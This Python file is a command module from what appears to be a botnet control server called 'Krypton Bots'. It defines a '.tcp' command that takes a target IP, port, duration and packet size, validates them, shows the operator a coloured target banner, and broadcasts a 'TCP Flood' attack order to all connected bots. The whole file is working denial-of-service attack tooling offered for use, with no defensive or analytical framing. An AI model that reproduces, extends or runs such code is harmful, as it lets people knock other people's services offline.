from colorama import Fore

def tcp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data):
    if len(args) == 5:
        ip = args[1]
        port = args[2]
        secs = args[3]
        size = args[4]

        xxxx = '''%s============= (%sTARGET%s) ==============
            %s  IP:%s %s
            %sPORT:%s %s
            %sTIME:%s %s
            %sSIZE:%s %s
          %sMETHOD:%s %s'''%(Fore.LIGHTWHITE_EX, Fore.GREEN, Fore.LIGHTWHITE_EX, Fore.CYAN, Fore.YELLOW, ip, Fore.CYAN, Fore.YELLOW, port, Fore.CYAN, Fore.YELLOW, secs, Fore.CYAN, Fore.YELLOW, size, Fore.CYAN, Fore.YELLOW, 'TCP Flood')

        if validate_ip(ip):
            if validate_port(port):
                if validate_time(secs):
                    if validate_size(size):
                        for x in xxxx.split('\n'):
                            send(client, '\x1b[3;31m'+ x)
                        send(client, f" {Fore.LIGHTWHITE_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTWHITE_EX} sent to all Krypton Bots!\n")
                        broadcast(data)
                    else:
                        send(client, Fore.RED + '\nInvalid packet size (1-65500 bytes)\n')
                else:
                    send(client, Fore.RED + '\nInvalid attack duration (10-1300 seconds)\n')
            else:
                send(client, Fore.RED + '\nInvalid port number (1-65535)\n')
        else:
            send(client, Fore.RED + '\nInvalid IP-address\n')
    else:
        send(client, f'\nUsage: {Fore.YELLOW}.tcp [IP] [PORT] [TIME] [SIZE]\n')
